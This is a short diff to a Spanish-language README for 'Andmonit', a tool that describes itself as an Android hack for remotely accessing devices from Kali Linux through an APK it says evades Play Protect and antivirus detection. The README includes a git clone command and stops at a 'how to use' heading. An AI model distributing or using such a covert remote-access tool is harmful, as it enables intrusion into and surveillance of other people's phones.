@@ -1,6 +1,8 @@
 # Andmonit
 Andmonit 2.0.3 ANDROID HACK
+
 By: Genplat
+
 Andmonit es un software para acceder remotamente a dispositivos android desde kali linux con una simple apk la cual no es identificada por play protect ni por muchos antivirus. Si se va a compartir por favor dar creditos a genplat, para clonar el repositorio simplemente pega esto en la terminal: git clone https://github.com/Genplat/Andmonit/
 
 COMO USAR:
